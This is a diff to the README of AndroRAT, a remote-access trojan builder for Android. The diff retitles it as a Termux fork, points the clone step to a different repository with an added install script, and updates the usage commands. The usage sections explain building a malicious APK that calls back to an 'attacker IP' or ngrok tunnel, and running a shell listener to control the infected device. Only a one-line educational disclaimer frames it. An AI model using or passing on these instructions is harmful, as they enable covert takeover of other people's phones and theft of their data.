@@ -1,5 +1,5 @@
 **Disclaimer** : This software is meant for educational purposes only. I don't feel responsible for any malicious use of the app.
-# AndroRAT 
+# AndroRAT forked For Termux all Bugs and errors are fixed by me 
 
 [![MIT License](https://img.shields.io/badge/license-MIT-blue.svg)](https://opensource.org/licenses/MIT) 
 [![Twitter Follow](https://img.shields.io/twitter/follow/karma9874?label=Follow&style=social)](https://twitter.com/karma9874)
@@ -29,8 +29,12 @@ AndroRAT is a tool designed to give the control of the android system remotely a
 AndroRAT requires Python (3.6-3.8) and JAVA 8 (or Android Studio)
 
 ## Installation
+
 ```
-git clone https://github.com/karma9874/AndroRAT.git
+
+git clone https://github.com/FullPenetrationTesting/AndroRAT
+./install.sh
+
 pip install -r requirements.txt
 ```
 #### Note: 
@@ -59,7 +63,7 @@ You must run Git bash with administrator privileges.
 
 ```
 Usage:
-  python androRAT.py --build --ngrok [flags]
+  python3 androRAT.py --build --ngrok [flags]
   Flags:
     -p, --port              Attacker port number (optional by default its set to 8000)
     -o, --output            Name for the apk file (optional by default its set to "karma.apk")
@@ -68,7 +72,7 @@ Usage:
 
 ```
 Usage:
-  python androRAT.py --build [flags]
+  python3 androRAT.py --build [flags]
   Flags:
     -i, --ip                Attacker IP address (required)
     -p, --port              Attacker port number (required)
@@ -80,7 +84,7 @@ Or you can manually build the apk by importing [Android Code](Android_Code) fold
 ### `shell` mode
 ```
 Usage:
-  python androRAT.py --shell [flags]
+  python3 androRAT.py --shell [flags]
   Flags:
     -i, --ip                Listner IP address
     -p, --port              Listner port number
